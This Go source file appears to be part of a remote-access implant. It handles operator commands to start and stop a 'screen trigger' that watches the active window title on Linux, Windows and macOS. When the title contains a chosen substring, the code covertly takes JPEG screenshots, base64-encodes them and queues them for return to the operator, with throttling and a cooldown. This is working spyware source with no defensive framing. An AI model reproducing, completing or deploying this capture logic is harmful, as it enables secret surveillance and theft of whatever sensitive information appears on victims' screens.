//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var (
	screenTriggering   int32
	screenTriggerMatch atomic.Value // string
)

const (
	screenTriggerMinInterval = 2
	screenTriggerMaxInterval = 120
	screenTriggerCooldown    = 15 * time.Second
	screenTriggerQuality     = 55
)

func parseScreenTriggerArgs(command string) (match string, intervalSec int, err error) {
	intervalSec = 5
	command = strings.TrimSpace(command)
	if command == "" {
		return "", 0, fmt.Errorf("screen_trigger_start: window title substring required")
	}
	if i := strings.LastIndex(command, ","); i > 0 {
		tail := strings.TrimSpace(command[i+1:])
		if n, e := strconv.Atoi(tail); e == nil && n > 0 {
			intervalSec = n
			command = strings.TrimSpace(command[:i])
		}
	}
	if command == "" {
		return "", 0, fmt.Errorf("screen_trigger_start: window title substring required")
	}
	if intervalSec < screenTriggerMinInterval {
		intervalSec = screenTriggerMinInterval
	}
	if intervalSec > screenTriggerMaxInterval {
		intervalSec = screenTriggerMaxInterval
	}
	return command, intervalSec, nil
}

func titleMatchesTrigger(title, match string) bool {
	if match == "" || title == "" {
		return false
	}
	return strings.Contains(strings.ToLower(title), strings.ToLower(match))
}

func handleScreenTriggerStart(task Task, res *TaskResult) {
	match, intervalSec, err := parseScreenTriggerArgs(task.Command)
	if err != nil {
		res.Error = err.Error()
		return
	}
	screenTriggerMatch.Store(match)
	if !atomic.CompareAndSwapInt32(&screenTriggering, 0, 1) {
		res.Output = fmt.Sprintf("screen trigger already running (match=%q interval=%ds)", match, intervalSec)
		return
	}
	go screenTriggerLoop(task.ID, match, intervalSec)
	res.Output = fmt.Sprintf("screen trigger started match=%q interval=%ds cooldown=%s", match, intervalSec, screenTriggerCooldown)
}

func handleScreenTriggerStop(task Task, res *TaskResult) {
	_ = task
	atomic.StoreInt32(&screenTriggering, 0)
	res.Output = "screen trigger stopped"
}

func screenTriggerLoop(taskID uint, match string, intervalSec int) {
	defer atomic.StoreInt32(&screenTriggering, 0)
	lastTitle := ""
	var lastShot time.Time
	tick := time.NewTicker(time.Duration(intervalSec) * time.Second)
	defer tick.Stop()
	for atomic.LoadInt32(&screenTriggering) == 1 {
		title := getActiveWindowTitle()
		if titleMatchesTrigger(title, match) {
			due := lastShot.IsZero() || title != lastTitle || time.Since(lastShot) >= screenTriggerCooldown
			if due && captureScreenTrigger(taskID, title) {
				lastShot = time.Now()
				lastTitle = title
			}
		} else {
			lastTitle = ""
		}
		select {
		case <-tick.C:
		}
		if atomic.LoadInt32(&screenTriggering) != 1 {
			return
		}
	}
}

func captureScreenTrigger(taskID uint, title string) bool {
	data, err := takeScreenshotJPEG(screenTriggerQuality)
	if err != nil {
		if Debug {
			fmt.Println("[screen_trigger]", err)
		}
		return false
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	sendScreenFrame(data)
	enqueueResult(TaskResult{
		TaskID:   taskID,
		Type:     "screen_trigger",
		Output:   b64,
		Encoding: "base64",
		Path:     title,
		Size:     int64(len(data)),
	})
	return true
}
